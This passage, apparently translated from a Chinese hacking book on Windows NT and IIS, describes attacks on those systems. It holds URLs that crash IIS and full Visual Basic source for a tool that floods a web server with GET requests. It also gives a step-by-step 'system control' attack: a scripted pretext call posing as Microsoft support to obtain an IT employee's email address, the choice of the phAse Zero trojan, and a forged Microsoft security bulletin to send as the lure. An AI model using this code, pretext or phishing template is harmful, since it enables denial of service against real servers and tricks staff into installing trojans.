
![](img/ba85bb40c695c02adae8cbd6666f2e0c_582_1.png)

**图 10.9** Telnet 黑客攻击的拒绝服务影响。

![](img/ba85bb40c695c02adae8cbd6666f2e0c_582_2.png)

**图 10.10** Dr. Watson 出手相助。

此时，IIS 可能会立即崩溃，或在计划的管理服务中断时崩溃——基本上是在管理关闭和/或服务重启时。破坏性请求包括以下 URL：

- `www.victim.com/Scripts/Tools/Newsdn.exe?Createdatabase`
- `www.victim.com/Scripts/Tools/Newsdn.exe?Create`

### 严重拥堵

**概要：** 自定义 HTTP 请求饱和可导致严重的资源退化。

**攻击状态：** CPU 拥堵。

**漏洞：** Win NT 3x、4 和 Internet Information Server 版本 3、4、5。

**突破：** 使用为无限命中次数编程的简单“地下”IIS 攻击软件模块（见图 10.11），远程攻击者可以导致严重的 CPU 拥堵，进而导致资源退化，最终可能导致服务拒绝。此处展示的程序是用 Visual Basic 编写的，仅包含单个窗体（见图 10.12）。

![](img/ba85bb40c695c02adae8cbd6666f2e0c_583_0.png)

![](img/ba85bb40c695c02adae8cbd6666f2e0c_583_1.png)

```vb
main.frm Private Stopper&
Private Sub Command1_Click()
On Error GoTo ErrorHandler
If Command1.Caption = "begin" Then
    If IsNumeric(Text2.Text) = False Then
        MsgBox "Please enter a valid amount!", vbExclamation, "" : Text2.Text = "0" : Exit Sub
    Command1.Caption = "stop"
    Text3.Visible = True
    For a = 1 To Text2.Text
        If Stopper& = 1 Then Exit Sub
        Do While Inet1.StillExecuting
            DoEvents
        Loop
        Inet1.Execute Text1.Text, "GET " & Text1.Text
        Text3.Text = Text3.Text + 1
    Next a
Else
    Stopper& = 1
    Command1.Caption = "begin"
    Text3.Visible = False
End If
Exit Sub
ErrorHandler:
MsgBox "Please enter a valid web server!", vbInformation, ""
Exit Sub
End Sub
```

## 系统控制

本节的目的是在 Win NT 服务器上重现一种常见的系统控制攻击。针对 IT 人员的此类攻击几乎每天都在发生。为了简化，将此攻击分为几个轻松完成的步骤：

### 步骤 1：搜索

在此步骤中，攻击者选择一名 IT 人员作为受害者。无论攻击者是否已经知道受害者，或者是在搜索受害者的公司网站，进行一些社会工程以揭示目标电子邮件地址都花费很少的精力。值得注意的是，一些网站实际上公开了 IT 人员的支持电子邮件地址，更值得注意的是，还包括个人姓名、地址甚至照片。

这种社会工程技术示例就像从婴儿手中夺走糖果一样容易：

- **黑客：** “早上好；我是微软的 Joe Hacker。请转接给你们的 IT 部门。他们期待我的来电，因为我在回复支持电话，工单号 110158。”

- **前台：** “哦，好的。您知道您要联系的人的名字吗？”

- **黑客：** “不，抱歉... 来电者没有留下名字... 等等，让我查一下...（黑客在键盘上打字的声音）。不，只有这个联系电话。”

- **前台：** “我会把您转给汤姆；他在 IT 部。他会知道该把您转给谁。”

- **汤姆：** “你好？”

- **黑客：** “早上好，汤姆；我是微软支持的 Joe Hacker。我在回复支持电话，工单号 110158，我打这个电话是为了将您的员工添加到我们的自动 NT 安全警报列表中。”

- **汤姆：** “您原本想联系谁？”

- **黑客：** “我们的终端今天早上宕机了，我只有这个联系电话。我只需要一个 IT 人员电子邮件地址，以便添加到我们的自动 NT 安全警报列表中。当有针对任何已证实的 NT 漏洞的新补丁可用时，收件人将收到更新。目前，有三个新补丁在队列中。另外…”（被打断）

- **汤姆：** “太棒了；试图跟上这些补丁很头疼。”

- **黑客：** “这里显示您的主要 Web 服务器正在运行 IIS。是哪个版本？”

- **汤姆：** “信不信由你，是 3.0。我们完全忙不过来，所以把它搁置了。您可以使用我的地址接收公告；它是 tom.fooled@victim.com。”

- **黑客：** “视为已完成，工单关闭。祝您愉快。”

### 步骤 2：警报

在此步骤中，攻击者决定远程守护进程及伴随消息。在此特定情况下，攻击者选择了 phAse Zero：

**端口：** 555、9989

**服务：** Ini-Killer、NeTAdmin、phAse Zero、Stealth Spy

**黑客策略：** 除了间谍功能和文件传输外，这些木马的最重要目的是破坏目标系统。唯一的宽慰是，这些守护程序只能在执行需要在主机上运行的安装程序时感染系统。

使用如前本书中提到的邮件伪造程序，攻击者的消息（伪造自微软）到达了：

```
>On 10 Oct 2000, at 18:09, support@microsoft.com wrote:
>
>Issue
>
>======
>
>This vulnerability involves the HTTP GET method, which is used to obtain
>
>information from an IIS Web server. Specially malformed GET requests can
>
>create a denial-of-service situation that consumes all server resources,
>
>causing a server to “hang.” In some cases, the server can be put back into
>
>service by stopping and restarting IIS; in others, the server may need to
>
>be rebooted. This situation cannot happen accidentally. The malformed GET
>
>requests must be deliberately constructed and sent to the server. It is
>
>important to note that this vulnerability does not allow data on the
>
>server to be compromised, nor does it allow any privileges on it to be usurped.
```

## 受影响的软件版本

- Microsoft Internet Information Server，x86 和 Alpha 平台上的 3.0 和 4.0 版本。

## 客户应采取的措施

此漏洞的附带补丁是完全支持的，并应立即应用，因为所有系统均被确定存在遭受攻击的风险。Microsoft 建议客户根据物理可访问性、网络、Internet 连接以及其他因素，评估此漏洞对其系统构成的风险程度。

## 获取此问题的支持

这是一个受支持的补丁。如果您在安装此补丁时遇到问题，或需要有关此补丁的技术支持，请联系 Microsoft 技术支持。有关联系 Microsoft 技术支持的信息，请参见 `http://support.microsoft.com/support/contact/default.asp`。

## 修订记录

- 2000 年 10 月 10 日：创建公告

如需了解有关 Microsoft 产品的额外安全相关信息，请访问 `http://www.microsoft.com/security`。
